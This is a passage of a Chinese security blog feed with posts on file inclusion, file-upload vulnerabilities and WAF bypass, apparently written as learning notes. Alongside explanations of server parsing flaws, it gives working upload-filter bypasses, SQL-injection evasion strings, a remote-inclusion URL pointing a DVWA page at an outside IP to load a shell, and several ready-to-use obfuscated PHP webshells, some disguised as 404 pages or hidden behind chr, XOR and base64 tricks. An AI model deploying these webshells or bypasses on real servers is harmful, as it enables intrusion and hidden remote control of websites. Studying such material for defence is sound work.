class="hljs-comment">//C:/phpStudy/PHPTutorial/WWW/phpinfo.zip%23phpinfo.txt</span><br><br>phar:<span class="hljs-comment">//相对路径(或绝对路径)%23文件名</span><br>phar:<span class="hljs-comment">//phpinfo.zip/phpinfo.txt</span><br></code></pre></td></tr></table></figure></p><h3 id="其它情形"><a href="#其它情形" class="headerlink" title="其它情形"></a>其它情形</h3><p>情形：</p><ul><li>存在文件包含漏洞</li><li>Apache是默认配置</li><li>只允许包含本地文件</li><li>没有上传接口</li><li>本地自身没有木马</li></ul><p>提问：<br>怎么构造文件包木马</p><p>方案之一：<br>修改referrer中的日志，即进行访问，后台自动记录（只要能写入日志并访问即可）<br>注意日志打包时间（通常在凌晨），日志中若存在尖括号则会报语法错误，最好在打完包的新日志中进行操作 </p><hr><p>##补充</p><h3 id="菜刀远程包含应用"><a href="#菜刀远程包含应用" class="headerlink" title="菜刀远程包含应用"></a>菜刀远程包含应用</h3><p>实例：<br>远程木马包含<br><a href="http://127.0.0.1/dvwa-master/vulnerabilities/fi/?page=http://144.172.116.200/test.jpg" target="_blank" rel="noopener">http://127.0.0.1/dvwa-master/vulnerabilities/fi/?page=http://144.172.116.200/test.jpg</a><br>使用一句话木马连菜刀<br>需加cookie:<br>浏览器控制台获取coockie<br>console.log(document.cookie)<br>security=low; hd_auth=9e89J6bNsPGJSDjq9t7IcVyR5d5gs3TBAHAx1mka%2BYX3vezWSFyMKG1izkauDUNgZiss3LfAUyGSw2ZS9jhY; PHPSESSID=416e68aaff8e7a3d55d04b745ac6785c</p><p>c刀设置中添加cookie</p><h3 id="DVWA文件包含"><a href="#DVWA文件包含" class="headerlink" title="DVWA文件包含"></a>DVWA文件包含</h3><h4 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h4><p>双写绕过</p><h4 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">file/../<br></code></pre></td></tr></table></figure><p>注：file不存在亦可</p>]]></content>
      
      
      
        <tags>
            
            <tag> File </tag>
            
            <tag> Include </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2019/01/10/File-upload-hole/"/>
      <url>/2019/01/10/File-upload-hole/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>文件上传漏洞是WEB安全中经常利用到的一种漏洞形式。这种类型的攻击从大的类型上来说是攻击“数据与代码分离原则”的一种攻击。<br>在文件上传功能处，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户上传恶意的脚本文件时就有可能获取执行服务端命令的能力，这就是文件上传漏洞</p></blockquote><h3 id="前端表单"><a href="#前端表单" class="headerlink" title="前端表单"></a>前端表单</h3><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"upload_file.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"file"</span>&gt;</span>Filename:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"file"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"submit"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中<code>upload_file.php</code>规定了处理上传数据的后台php脚本文件<br><code>method</code>规定上传的方法为post方法<br><code>enctype</code>规定了上传数据的编码方式<br><code>multipart/form-data</code>表示不进行编码，文件上传的表单一般采用此方式</p><hr><h3 id="后端处理"><a href="#后端处理" class="headerlink" title="后端处理"></a>后端处理</h3><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"error"</span>]) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Error:"</span>.$_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"error"</span>].<span class="hljs-string">"&lt;br /&gt;"</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Upload:"</span>.$_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>].<span class="hljs-string">"&lt;br /&gt;"</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Type:"</span>.$_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"type"</span>].<span class="hljs-string">"&lt;br /&gt;"</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Size:"</span>.($_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"size"</span>]/<span class="hljs-number">1024</span>).<span class="hljs-string">"Kb&lt;br /&gt;"</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Stored in:"</span>.$_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>].<span class="hljs-string">"&lt;br /&gt;"</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">"upload/"</span>.$_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> $_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>].<span class="hljs-string">" already exists."</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    move_uploaded_file($_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>], <span class="hljs-string">"upload/"</span>.$_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Stored in: "</span>.<span class="hljs-string">"upload/"</span>.$_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>];<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>服务器拿到上传的文件数据后，会先将其存为一个临时文件，由<code>$_FILES</code>这个全局变量调取使用</p><p><code>$_FILES</code>里有很多文件对应的属性<br><code>type</code>：文件类型<br><code>name</code>：文件名<br><code>size</code>：文件大小<br><code>tmp_name</code>：临时文件的存储位置<br>通过对这些属性进行判断与限制，可控制文件上传的类别、大小等</p><hr><h3 id="检测方式"><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h3><p>常见的对上传文件的检测方式</p><ul><li>任意上传</li><li>js验证</li><li>文件扩展名检测</li><li>MIME-type加测</li><li>文件头检测(x504B：压缩包；文本文件文件头就是本身)</li><li>文件加载检测</li></ul><hr><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><ul><li>任意文件上传：没有任何校验</li><li>绕过js校验上传：校验发生在前端</li><li><p>绕过后端校验上传：校验发生在后端</p><blockquote><ul><li>绕过文件类型校验</li><li>绕过扩展名校验</li><li>绕过文件头校验</li></ul></blockquote></li><li><p>结合解析漏洞上传：中间件解析漏洞造成</p></li><li>其它类型</li></ul><hr><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="IIS6-0"><a href="#IIS6-0" class="headerlink" title="IIS6.0"></a>IIS6.0</h4><ul><li>目录解析<br>漏洞原理：<br>服务器默认会把xx.asp目录下的文件都解析成asp文件</li></ul><p>漏洞形式：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www.xxx.com/xx.asp/xx.jpg<br></code></pre></td></tr></table></figure></p><ul><li>文件解析<br>漏洞原理：服务器默认不解析<code>;</code>后面的内容，因此<code>xx.asp;.jpg</code>便被解析成asp文件了</li></ul><hr><h4 id="Apache-1-x-2-x"><a href="#Apache-1-x-2-x" class="headerlink" title="Apache 1.x 2.x"></a>Apache 1.x 2.x</h4><p>实验环境：wamp2.0<br>漏洞原理：Apache解析文件的规则为从右到左开始判断解析，若后缀名为不可识别文件解析，则再往左判断<br>例如：<code>test.php.a.b</code>的<code>.a</code>和<code>.b</code>，此两种后缀是Apache不可识别解析，Apache将会把<code>test.php.a.b</code>解析成<code>test.php</code></p><p>漏洞形式：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www.test.com/test.php.a<br></code></pre></td></tr></table></figure></p><p>其余配置问题：</p><ol><li>若Apache的<code>conf</code>里有如下配置，则文件名里只要包含<code>.php</code>，即使文件名形如：<code>test2.php.jpg</code>，依旧会以PHP文件来执行<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">AddHandler php5-script.php<br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="Nginx-1-4-6"><a href="#Nginx-1-4-6" class="headerlink" title="Nginx 1.4.6"></a>Nginx 1.4.6</h4><p>漏洞原理：<br>Nginx接收到文件路径(URI)形如：<code>/test.jpg/test.php</code>之后，一遇到后缀是<code>.php</code>，即判断该文件是PHP文件，并转交给php去处理。而php处理是发现<code>/test.jpg/test.php</code>不存在，便删去最后面的<code>/test.php</code>，而又发现<code>/test.jpg</code>存在，便将<code>/test.jpg</code>当成要执行的文件了，但又因后缀为<code>.jpg</code>，则php认定此文件不是php文件，于是返回<code>Access denied</code><br>此中涉及到php的一个选项：<code>cgi.fix_pathinfo</code>，该值默认为<code>1</code>，表示开启。开启此选项后，php可对文件路径进行“修理”。<br>例如：当php遇到文件路径<code>/1.jpg/2.txt/3.php</code>是，若<code>/1.jpg/2.txt/3.php</code>不存在，则会去掉最后的<code>/3.php</code>，然后判断<code>/1.jpg/2.txt</code>是否存在。若存在，则把<code>/1.jpg/2.txt</code>当作文件<code>/1.jpg/2.txt/3.php</code>，此时若<code>/1.jpg/2.txt</code>仍不存在，则再去掉<code>/2.txt</code>，以此类推</p><p>漏洞形式：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www.xxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxx.com/UploadFiles/image/1.jpg/%20\0.php<br></code></pre></td></tr></table></figure></p><hr><h4 id="IIS7-5"><a href="#IIS7-5" class="headerlink" title="IIS7.5"></a>IIS7.5</h4><p>类似于Nginx，都是由于php配置文件中，开启了<code>cgi.fix_pathinfo</code>，而这并非Nginx或IIS7.5本身的漏洞</p><p>漏洞形式：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www.xxx.com/UploadFiles/image/1.jpg/1.php<br></code></pre></td></tr></table></figure></p><hr><h4 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h4><p>漏洞原理：<br>旧版Windows Server中存在空格和dot漏洞，类似于<code>a.php.</code>和<code>a.php</code>这样的文件名存储后，会被Windows去掉点和空格，从而使得加上这两个特殊字串后，可以突破过滤，成功上传，并且被当作php代码执行</p><p>漏洞形式：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">test.asp.<br>test.asp[空格] <br><br>test.php:1.jpg<br>test.php:: <span class="hljs-variable">$DATA</span><br></code></pre></td></tr></table></figure></p><hr><h4 id="富文本编辑器"><a href="#富文本编辑器" class="headerlink" title="富文本编辑器"></a>富文本编辑器</h4><p>参考：<br><a href="https://www.webshell.cc/1006.html" target="_blank" rel="noopener">https://www.webshell.cc/1006.html</a><br><a href="https://blog.csdn.net/u011781521/article/details/59057759" target="_blank" rel="noopener">https://blog.csdn.net/u011781521/article/details/59057759</a><br><a href="https://www.cnblogs.com/qunshu/p/3286650.html" target="_blank" rel="noopener">https://www.cnblogs.com/qunshu/p/3286650.html</a><br><a href="https://www.0dayhack.com/post-426.html" target="_blank" rel="noopener">https://www.0dayhack.com/post-426.html</a></p><hr><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><h4 id="前端验证绕过"><a href="#前端验证绕过" class="headerlink" title="前端验证绕过"></a>前端验证绕过</h4><ul><li>修改验证函数，在白名单中添加php等后缀名</li><li>删除调用接口，不调用函数（浏览器-&gt;元素检查-&gt;右键在控制台使用）</li><li>浏览器功能禁用js</li><li>无视前端，抓包改包</li></ul><hr><h4 id="MINE绕过"><a href="#MINE绕过" class="headerlink" title="MINE绕过"></a>MINE绕过</h4><p>MINE是用于确认请求包中文件类型与后缀名之间的关系的<br>文件路径：<code>Apache-&gt;conf-&gt;MINE.typtes</code><br>绕过方法：抓包，修改<code>Content-Type</code>字段</p><hr><h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><p>找出未被列入黑名单的可利用文件类型</p><hr><h4 id="htaccess-仅Apache"><a href="#htaccess-仅Apache" class="headerlink" title=".htaccess(仅Apache)"></a>.htaccess(仅Apache)</h4><p>提供了针对目录改变配置的方法（需要Apache开启了相关配置）<br>将下列文件上传到利用路径下，可临时改变上传路径文件夹的解析规则，将所有以<code>.a</code>为后缀的文件都以php的方式解析</p><p><code>.htaccess</code><br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">AddType application/x-httpd-php .a<br></code></pre></td></tr></table></figure></p><hr><h4 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h4><p>未对后缀名大小写进行严格验证，导致黑名单出现逻辑漏洞</p><hr><h4 id="Windwos特性"><a href="#Windwos特性" class="headerlink" title="Windwos特性"></a>Windwos特性</h4><p>文件后缀名后添加空格或点导致绕过<br>原理：Windows系统不允许文件后缀后添加点和空格，会将其自动去除<br>利用：使用burpsuite抓包改包<br><code>.</code>，<code></code>,<br><code>..</code> 绕过删除末尾的点且不改名的上传</p><hr><h4 id="NTFS文件流特性"><a href="#NTFS文件流特性" class="headerlink" title="NTFS文件流特性"></a>NTFS文件流特性</h4><p><code>::$DATA</code>：传输数据，将数据写入<code>::$DATA</code>之前的文件名中<br><code>寄生文件</code>：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> &lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'a'</span>]);?&gt; &gt;&gt; jisheng.php:shell.exe<br></code></pre></td></tr></table></figure></p><hr><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>服务端使用了<code>str_replace,str_ireplace</code>等函数进行过滤<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">pphphp  <span class="hljs-comment"># 正确</span><br>phphpp  <span class="hljs-comment"># 错误</span><br></code></pre></td></tr></table></figure></p><hr><h4 id="截断上传（00截断）"><a href="#截断上传（00截断）" class="headerlink" title="截断上传（00截断）"></a>截断上传（00截断）</h4><p>基于一个组合逻辑漏洞造成的。攻击者修改上传过程中的POST包，在文件名后添加一个<code>%00</code>字节，则可以阶段某些函数对文件名的判断。</p><p>原因：在许多语言的函数中，如：C、PHP等语言的常用字符串处理函数中，<code>0x00</code>被认为是终止符。</p><p>受此影响的环境有Web应用和一些服务器，可构造如<code>xxx.php[\0].jpg</code>的文件，其中<code>[\0]</code>代表十六进制的<code>0x00</code>字符，以此绕过上传文件类型判断；但对服务器来说，此文件因为<code>0x00</code>字符截断的关系，最终却变成<code>xxx.php</code></p><p>URL或POST请求实体中带有上传后存储路径的，考虑路径后跟文件名并且截断。<br>适用：<code>PHP 5.2.x</code><br>需关掉配置文件<code>magic_quotes_gpc()</code></p><hr><h4 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h4><p>伪造文件头<br>如：图片马，配合文件包含使用</p><ol><li>使用burpsuite抓包，先上传图片，删除后边内容，写入webshell</li><li>使用cmd命令行中的copy命令合成图片马：<figure class="hljs highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">copy</span> moon.gif/b+webshell.PHP/a gifshell.gif<br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="图片二次渲染绕过"><a href="#图片二次渲染绕过" class="headerlink" title="图片二次渲染绕过"></a>图片二次渲染绕过</h4><p>服务端对上传的图片进行了二次渲染<br>绕过方法：对上传的图片马进行特殊处理，使得关键信息能在二次渲染后仍旧得以保留</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>文件上传漏洞对Web应用来说是一种非常严重的漏洞。一般情况下，Web应用都会允许用户上传一些文件，如头像、附件等信息，若Web应用未对用户上传的文件进行有效的检查过滤，那么恶意用户就会上传一句话木马等Webshell，从而达到控制Web网站的目的</p><hr><h2 id="高危触发点"><a href="#高危触发点" class="headerlink" title="高危触发点"></a>高危触发点</h2><ul><li>相册、头像上传</li><li>视频、照片分享</li><li>附件上传（论坛发帖、邮件）</li><li>文件管理器：即富文本编辑器（fckeitor、webeditor、xxxx editor等）</li></ul><hr>]]></content>
      
      
      
        <tags>
            
            <tag> File </tag>
            
            <tag> Upload </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WAF绕过</title>
      <link href="/2019/01/09/WAF_Passby/"/>
      <url>/2019/01/09/WAF_Passby/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><strong><code>WAF(Web Application Firewall)</code></strong><br>Web应用防护系统（也称：网站应用级入侵防御系统或Web防火墙）。主要是对Web特有入侵方式的加强防护，如：DDOS、SQL注入、XML注入、XSS等防护<br>web应用防火墙，是一种防御规则的集合</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li>代码WAF</li><li>软件WAF</li><li>硬件WAF</li><li>云WAF（类似于DNS）</li></ul><h3 id="三个基本步骤"><a href="#三个基本步骤" class="headerlink" title="三个基本步骤"></a>三个基本步骤</h3><ul><li>身份认证</li><li>数据包解析</li><li>规则匹配</li></ul><hr><h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="规则绕过"><a href="#规则绕过" class="headerlink" title="规则绕过"></a>规则绕过</h3><p>常用方式</p><ol><li>大小写混合<br><code>uNIoN sELecT 1,2,3,4</code></li><li>替换关键字<br><code>selselectect 1,2,3,4</code></li><li>使用编码<br><code>%55nion %53elect 1,2,3,4</code></li><li>使用注释<br><code>union/**/select 1,2,3,4</code></li><li>等价函数与命令<br><code>@@datadir ==&gt; datadir()</code></li><li>特殊符号<br><code>select+id+from users;</code></li></ol><hr><h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><ol><li>执行代码的方式执行命令</li><li>直接执行系统命令</li></ol><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p>WAF会检测一些危险函数<br>eval()<br>assert()<br>passthru()<br>preg_replace(“1/e”,command,”test”);</p><p>system()<br>exec()<br>exec_shell()</p><hr><h3 id="一句话木马变形（小马）"><a href="#一句话木马变形（小马）" class="headerlink" title="一句话木马变形（小马）"></a>一句话木马变形（小马）</h3><h4 id="加密类"><a href="#加密类" class="headerlink" title="加密类"></a>加密类</h4><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">"404 Not Found!&lt;/br&gt;"</span>; error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'com'</span>]) &amp;&amp; md5($_POST[<span class="hljs-string">'com'</span>]) == <span class="hljs-string">'791dc312b38016ef998c1c146104cd5a'</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'content'</span>])) $content = strtr($_POST[<span class="hljs-string">'content'</span>], <span class="hljs-string">'-_,'</span>, <span class="hljs-string">'+/='</span>);<span class="hljs-keyword">eval</span>(base64_decode($content));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"We're sorry but the page your are looking for is Not Found..."</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="变量拼接类"><a href="#变量拼接类" class="headerlink" title="变量拼接类"></a>变量拼接类</h4><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$sF=<span class="hljs-string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="hljs-number">4</span>].$sF[<span class="hljs-number">5</span>].$sF[<span class="hljs-number">9</span>].$sF[<span class="hljs-number">10</span>].$sF[<span class="hljs-number">6</span>].$sF[<span class="hljs-number">3</span>].$sF[<span class="hljs-number">11</span>].$sF[<span class="hljs-number">8</span>].$sF[<span class="hljs-number">10</span>].$sF[<span class="hljs-number">1</span>].$sF[<span class="hljs-number">7</span>].$sF[<span class="hljs-number">8</span>].$sF[<span class="hljs-number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="hljs-number">11</span>].$sF[<span class="hljs-number">0</span>].$sF[<span class="hljs-number">7</span>].$sF[<span class="hljs-number">9</span>].$sF[<span class="hljs-number">2</span>])&#125;[<span class="hljs-string">'n985de9'</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($s22))&#123;<span class="hljs-keyword">eval</span>($s21($s22));&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="加密拼接类"><a href="#加密拼接类" class="headerlink" title="加密拼接类"></a>加密拼接类</h4><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> $_uU=chr(<span class="hljs-number">99</span>).chr(<span class="hljs-number">104</span>).chr(<span class="hljs-number">114</span>);$_cC=$_uU(<span class="hljs-number">101</span>).$_uU(<span class="hljs-number">118</span>).$_uU(<span class="hljs-number">97</span>).$_uU(<span class="hljs-number">108</span>).$_uU(<span class="hljs-number">40</span>).$_uU(<span class="hljs-number">36</span>).$_uU(<span class="hljs-number">95</span>).$_uU(<span class="hljs-number">80</span>).$_uU(<span class="hljs-number">79</span>).$_uU(<span class="hljs-number">83</span>).$_uU(<span class="hljs-number">84</span>).$_uU(<span class="hljs-number">91</span>).$_uU(<span class="hljs-number">49</span>).$_uU(<span class="hljs-number">93</span>).$_uU(<span class="hljs-number">41</span>).$_uU(<span class="hljs-number">59</span>);$_fF=$_uU(<span class="hljs-number">99</span>).$_uU(<span class="hljs-number">114</span>).$_uU(<span class="hljs-number">101</span>).$_uU(<span class="hljs-number">97</span>).$_uU(<span class="hljs-number">116</span>).$_uU(<span class="hljs-number">101</span>).$_uU(<span class="hljs-number">95</span>).$_uU(<span class="hljs-number">102</span>).$_uU(<span class="hljs-number">117</span>).$_uU(<span class="hljs-number">110</span>).$_uU(<span class="hljs-number">99</span>).$_uU(<span class="hljs-number">116</span>).$_uU(<span class="hljs-number">105</span>).$_uU(<span class="hljs-number">111</span>).$_uU(<span class="hljs-number">110</span>);$_=$_fF(<span class="hljs-string">""</span>,$_cC);@$_();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="其他变形"><a href="#其他变形" class="headerlink" title="其他变形"></a>其他变形</h4><p>404伪装<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>&lt;!DOCTYPE HTML <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;<br>&lt;html&gt;&lt;head&gt;<br>&lt;title&gt;<span class="hljs-number">404</span> Not Found&lt;/title&gt;<br>&lt;/head&gt;&lt;body&gt;<br>&lt;h1&gt;Not Found&lt;/ht&gt;<br>&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;<br>&lt;/body&gt;&lt;/html&gt;<br><span class="hljs-meta">&lt;?php</span><br>@preg_replace(<span class="hljs-string">"/[pageerror]/e"</span>,$_POST[<span class="hljs-string">'error'</span>],<span class="hljs-string">"saft"</span>);<br>header(<span class="hljs-string">'HTTP/1.1 404 Not Found'</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>正则与或运算拼接：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@$_++;  <span class="hljs-comment">// not defined variable ++,the result is 1</span><br>$__=(<span class="hljs-string">"#"</span>^<span class="hljs-string">"|"</span>);<br>$__.=(<span class="hljs-string">"."</span>^<span class="hljs-string">"~"</span>);<br>$__.=(<span class="hljs-string">"/"</span>^<span class="hljs-string">"`"</span>);<br>$__.=(<span class="hljs-string">"|"</span>^<span class="hljs-string">"/"</span>);<br>$__.=(<span class="hljs-string">"&#123;"</span>^<span class="hljs-string">"/"</span>);<br>$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);<br><span class="hljs-comment">//$_POST[0]($_POST[1]);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p><code>substr()</code>与<code>base64_decode</code>联用：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$O=substr(<span class="hljs-string">"Ping-Pong"</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>);<br>$R=substr(<span class="hljs-string">"MONSTER"</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>);<br>$you = <span class="hljs-string">'_'</span>.$O.<span class="hljs-string">'O'</span>.$R.<span class="hljs-string">'T'</span>;<br>$hack=base64_decode(<span class="hljs-string">"YXNzZXJ0"</span>);<br>$hack($&#123;$you&#125;[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">//assert($_POST[1])</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><hr><p>##补充</p><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" 